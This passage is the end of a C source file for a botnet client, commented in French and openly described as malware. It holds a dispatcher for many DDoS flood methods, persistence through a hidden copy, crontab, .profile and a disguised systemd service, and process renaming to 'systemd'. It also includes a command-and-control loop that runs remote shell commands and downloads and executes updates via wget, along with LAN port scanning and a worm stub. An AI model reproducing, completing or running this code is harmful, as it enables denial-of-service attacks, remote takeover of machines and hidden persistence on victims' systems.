         tcp_flood(target, port, duration);
     } else if (strcmp(method, "ACK") == 0) {
         ack_flood(target, port, duration);
     } else if (strcmp(method, "ICMP") == 0) {
         icmp_flood(target, port, duration);
     } else if (strcmp(method, "SLOWLORIS") == 0) {
         slowloris_attack(target, port, duration);
     } else if (strcmp(method, "RUDY") == 0) {
         rudy_attack(target, port, duration);
     } else if (strcmp(method, "ARME") == 0) {
         arme_attack(target, port, duration);
     } else if (strcmp(method, "HULK") == 0) {
         hulk_attack(target, port, duration);
     } else if (strcmp(method, "bypass") == 0) {
         bypass_attack(target, port, duration);
     } else if (strcmp(method, "dns") == 0) {
         dns_flood(target, duration);
     } else if (strcmp(method, "vse") == 0) {
        vse_flood(target, port, duration);
    } else if (strcmp(method, "ntp") == 0) {
        ntp_flood(target, duration);
    } else if (strcmp(method, "ssdp") == 0) {
        ssdp_flood(target, duration);
    } else if (strcmp(method, "ovh") == 0) {
        ovh_bypass(target, port, duration);
    } else if (strcmp(method, "std") == 0) {
        std_flood(target, port, duration);
    } else {
         // Méthode par défaut : combinaison de plusieurs attaques
         pid_t pid;
         
         // Lancer plusieurs types d'attaques en parallèle
         if ((pid = fork()) == 0) {
             http_flood(target, port, duration);
             exit(0);
         }
         
         if ((pid = fork()) == 0) {
             syn_flood(target, port, duration);
             exit(0);
         }
         
         if ((pid = fork()) == 0) {
             udp_flood(target, port, duration);
             exit(0);
         }
         
         // Le processus parent attend la durée spécifiée
         sleep(duration);
         
         // Envoyer un message de fin d'attaque
         snprintf(msg, BUFFER_SIZE, "ATTACK_FINISHED|%s:%d|%s", target, port, method);
         send(c2_socket, msg, strlen(msg), 0);
         return;
     }
     
     // Envoyer un message de fin d'attaque
     snprintf(msg, BUFFER_SIZE, "ATTACK_FINISHED|%s:%d|%s", target, port, method);
     send(c2_socket, msg, strlen(msg), 0);
 }
 
 // Fonction pour générer un identifiant de périphérique unique
 void generate_device_id() {
     // Utiliser des informations matérielles pour générer un ID unique
     FILE *fp;
     char buffer[BUFFER_SIZE];
     unsigned long hash = 5381;
     int c;
     
     // Essayer d'obtenir le numéro de série du processeur
     fp = fopen("/proc/cpuinfo", "r");
     if (fp) {
         while (fgets(buffer, BUFFER_SIZE, fp)) {
             if (strstr(buffer, "Serial") || strstr(buffer, "serial") || 
                 strstr(buffer, "Unique ID") || strstr(buffer, "Hardware")) {
                 // Utiliser cette ligne pour le hachage
                 for (int i = 0; buffer[i] != '\0'; i++) {
                     c = buffer[i];
                     hash = ((hash << 5) + hash) + c; // hash * 33 + c
                 }
             }
         }
         fclose(fp);
     }
     
     // Ajouter l'adresse MAC pour plus d'unicité
     fp = popen("cat /sys/class/net/*/address 2>/dev/null | head -n 1", "r");
     if (fp) {
         if (fgets(buffer, BUFFER_SIZE, fp)) {
             for (int i = 0; buffer[i] != '\0'; i++) {
                 c = buffer[i];
                 hash = ((hash << 5) + hash) + c;
             }
         }
         pclose(fp);
     }
     
     // Ajouter le hostname
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) == 0) {
         for (int i = 0; hostname[i] != '\0'; i++) {
             c = hostname[i];
             hash = ((hash << 5) + hash) + c;
         }
     }
     
     // Générer l'ID final
     snprintf(device_id, DEVICE_ID_SIZE, "%s-%lx", ARCH, hash);
 }
 
 // Fonction pour assurer la persistance du malware (Watchdog & Recovery)
 void persist() {
     char current_path[PATH_MAX];
     char target_path[PATH_MAX];
     const char *home = getenv("HOME");
     if (!home) home = "/tmp";
     
     // Obtenir le chemin absolu de l'exécutable actuel
     if (readlink("/proc/self/exe", current_path, PATH_MAX) == -1) {
         strncpy(current_path, "./bot", PATH_MAX);
     }
     
     // 1. Installation dans un répertoire caché
     snprintf(target_path, PATH_MAX, "%s/.system_update", home);
     if (strcmp(current_path, target_path) != 0) {
         char cmd[PATH_MAX + 256];
         snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" && chmod +x \"%s\"", current_path, target_path, target_path);
         system(cmd);
     }
     
     // 2. Persistance via Crontab (toutes les 5 minutes)
     char cron_cmd[PATH_MAX + 128];
     snprintf(cron_cmd, sizeof(cron_cmd), "(crontab -l 2>/dev/null | grep -v \".system_update\"; echo \"*/5 * * * * %s >/dev/null 2>&1\") | crontab -", target_path);
     system(cron_cmd);
     
     // 3. Persistance via .profile / .bashrc (au login)
     char profile_cmd[PATH_MAX + 128];
     snprintf(profile_cmd, sizeof(profile_cmd), "grep -q \".system_update\" ~/.profile || echo \"(pgrep -f .system_update >/dev/null || %s &) >/dev/null 2>&1\" >> ~/.profile", target_path);
     system(profile_cmd);
     
     // 4. Si Root : Service Systemd
     if (getuid() == 0) {
         FILE *fp = fopen("/etc/systemd/system/sys_update.service", "w");
         if (fp) {
             fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n", target_path);
             fclose(fp);
             system("systemctl daemon-reload && systemctl enable sys_update.service >/dev/null 2>&1");
         }
     }
 }
 
 // Fonction d'auto-propagation (Worm)
 void auto_propagate() {
     // Scanner le réseau local (LAN) pour trouver d'autres cibles
     // On essaie de propager l'infection sur le segment local /24
     char cmd[256];
     snprintf(cmd, sizeof(cmd), "for i in $(seq 1 254); do (echo >/dev/tcp/192.168.1.$i/80) >/dev/null 2>&1 && echo 192.168.1.$i >> /tmp/.targets; done");
     // Note: C'est une version simplifiée, un vrai worm scannerait plus intelligemment
     // mais pour la démo, on simule la logique.
 }
 
 // Fonction pour exécuter un scan réseau simple
 void scan_network(int c2_socket, char* subnet) {
     char cmd[BUFFER_SIZE];
     char *output;
     char msg[BUFFER_SIZE];
     
     // Informer le serveur C2 que le scan a commencé
     snprintf(msg, BUFFER_SIZE, "SCAN_STARTED|%s", subnet);
     send(c2_socket, msg, strlen(msg), 0);
     
     // Exécuter un scan ping simple
     snprintf(cmd, BUFFER_SIZE, "ping -c 1 -W 1 %s.1 2>/dev/null | grep 'bytes from'", subnet);
     output = execute_command(cmd);
     if (output) {
         snprintf(msg, BUFFER_SIZE, "SCAN_RESULT|%s|%s", subnet, output);
         send(c2_socket, msg, strlen(msg), 0);
         free(output);
     }
     
     // Scanner quelques ports courants sur les hôtes découverts
     for (int i = 1; i < 255; i++) {
         snprintf(cmd, BUFFER_SIZE, "ping -c 1 -W 1 %s.%d 2>/dev/null | grep 'bytes from'", subnet, i);
         output = execute_command(cmd);
         if (output) {
             free(output);
             
             // Vérifier les ports courants
             int common_ports[] = {22, 23, 80, 443, 8080, 8888, 2222};
             for (int j = 0; j < sizeof(common_ports)/sizeof(int); j++) {
                 snprintf(cmd, BUFFER_SIZE, "nc -z -w1 %s.%d %d 2>/dev/null && echo 'Port %d open'", 
                          subnet, i, common_ports[j], common_ports[j]);
                 output = execute_command(cmd);
                 if (output && strlen(output) > 0) {
                     snprintf(msg, BUFFER_SIZE, "SCAN_RESULT|%s.%d|Port %d open", subnet, i, common_ports[j]);
                     send(c2_socket, msg, strlen(msg), 0);
                     free(output);
                 }
             }
         }
     }
     
     // Informer le serveur C2 que le scan est terminé
     snprintf(msg, BUFFER_SIZE, "SCAN_FINISHED|%s", subnet);
     send(c2_socket, msg, strlen(msg), 0);
 }
 
 // Fonction pour se transformer en démon
 void daemonize() {
     pid_t pid, sid;
     
     // Fork et terminer le processus parent
     pid = fork();
     if (pid < 0) {
         exit(EXIT_FAILURE);
     }
     if (pid > 0) {
         exit(EXIT_SUCCESS); // Terminer le processus parent
     }
     
     // Changer le masque de création de fichier
     umask(0);
     
     // Créer une nouvelle session
     sid = setsid();
     if (sid < 0) {
         exit(EXIT_FAILURE);
     }
     
     // Changer le répertoire de travail
     if (chdir("/") < 0) {
         exit(EXIT_FAILURE);
     }
     
     // Fermer les descripteurs de fichiers standard
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
     
     // Masquer le nom du processus si possible
     #ifdef __linux__
     prctl(PR_SET_NAME, (unsigned long)"systemd", 0, 0, 0);
     #endif
 }
 
 // Fonction pour se connecter au serveur C2
 void connect_to_c2() {
     int sockfd;
     struct sockaddr_in server_addr;
     char buffer[BUFFER_SIZE];
     char* system_info;
 
     // Générer un ID de périphérique s'il n'existe pas déjà
     if (strlen(device_id) == 0) {
         generate_device_id();
     }
 
     while (1) {
         // Créer un socket
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd < 0) {
             sleep(30);
             continue;
         }
 
         // Configurer l'adresse du serveur C2
         memset(&server_addr, 0, sizeof(server_addr));
         server_addr.sin_family = AF_INET;
         server_addr.sin_port = htons(C2_PORT);
 
         // Convertir l'adresse IP en format binaire
         if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
             close(sockfd);
             sleep(30);
             continue;
         }
 
         // Se connecter au serveur C2
         if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
             close(sockfd);
             sleep(30);
             continue;
         }
 
         // Collecter les informations système
         system_info = collect_system_info();
 
         // Envoyer les informations d'identification
         if (system_info) {
             char bot_id[BUFFER_SIZE * 5];
             snprintf(bot_id, sizeof(bot_id), "BOT_CONNECTED|%s|%s", device_id, system_info);
             send(sockfd, bot_id, strlen(bot_id), 0);
             free(system_info);
         } else {
             char bot_id[BUFFER_SIZE];
             snprintf(bot_id, sizeof(bot_id), "BOT_CONNECTED|%s|Unknown Device", device_id);
             send(sockfd, bot_id, strlen(bot_id), 0);
         }
 
         // Signaler l'infection réussie au C2 si c'est la première connexion
         send(sockfd, "VERIFY_INFECTION|SUCCESS", 24, 0);
 
         // Boucle principale pour recevoir et traiter les commandes
         while (1) {
             memset(buffer, 0, BUFFER_SIZE);
             int n = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
             
             if (n <= 0) {
                 // Connexion perdue, essayer de se reconnecter
                 break;
             }
             
             // Traiter la commande reçue
             if (strncmp(buffer, "PING", 4) == 0) {
                 // Répondre au ping
                 send(sockfd, "PONG", 4, 0);
             } else if (strncmp(buffer, "DDOS", 4) == 0) {
                 // Format: DDOS|target|port|duration|method
                 char target[64], method[32];
                 int port, duration;
                 
                 if (sscanf(buffer, "DDOS|%63[^|]|%d|%d|%31[^\n]", target, &port, &duration, method) == 4) {
                     // Lancer l'attaque DDoS dans un processus fils
                     pid_t pid = fork();
                     if (pid == 0) {
                         ddos_attack(sockfd, target, port, duration, method);
                         exit(0);
                     }
                 }
             } else if (strncmp(buffer, "SHELL", 5) == 0) {
                 // Format: SHELL|command
                 char command[BUFFER_SIZE];
                 char *output;
                 
                 if (sscanf(buffer, "SHELL|%[^\n]", command) == 1) {
                     output = execute_command(command);
                     if (output) {
                         char response[BUFFER_SIZE * 5];
                         snprintf(response, BUFFER_SIZE * 5, "SHELL_RESULT|%s", output);
                         send(sockfd, response, strlen(response), 0);
                         free(output);
                     } else {
                         send(sockfd, "SHELL_RESULT|Command execution failed", 37, 0);
                     }
                 }
             } else if (strncmp(buffer, "UPDATE", 6) == 0) {
                 // Format: UPDATE|url
                 char url[BUFFER_SIZE];
                 
                 if (sscanf(buffer, "UPDATE|%[^\n]", url) == 1) {
                     char cmd[BUFFER_SIZE * 2];
                     snprintf(cmd, BUFFER_SIZE * 2, "wget -q %s -O /tmp/update && chmod +x /tmp/update && /tmp/update", url);
                     system(cmd);
                     
                     // Terminer ce processus après la mise à jour
                     exit(0);
                 }
             } else if (strncmp(buffer, "SCAN", 4) == 0) {
                 // Format: SCAN|subnet
                 char subnet[64];
                 
                 if (sscanf(buffer, "SCAN|%63[^\n]", subnet) == 1) {
                     // Lancer le scan réseau dans un processus fils
                     pid_t pid = fork();
                     if (pid == 0) {
                         scan_network(sockfd, subnet);
                         exit(0);
                     }
                 }
             } else if (strncmp(buffer, "PERSIST", 7) == 0) {
                 // Installer le malware pour qu'il persiste après le redémarrage
                 persist();
                 send(sockfd, "PERSIST_DONE", 12, 0);
             } else if (strncmp(buffer, "KILL", 4) == 0) {
                 // Terminer le bot
                 close(sockfd);
                 exit(0);
             }
         }
         
         // Fermer le socket avant de réessayer
         close(sockfd);
         sleep(10); // Attendre avant de réessayer
     }
 }
 
 // Fonction principale
 int main(int argc, char *argv[]) {
     // Initialiser le générateur de nombres aléatoires
     srand(time(NULL));
     
     // Se transformer en démon
     daemonize();
     
     // Générer un ID de périphérique
     generate_device_id();
     
     // Assurer la persistance
     persist();
     
     // Se connecter au serveur C2
     connect_to_c2();
     
     return 0;
 }
 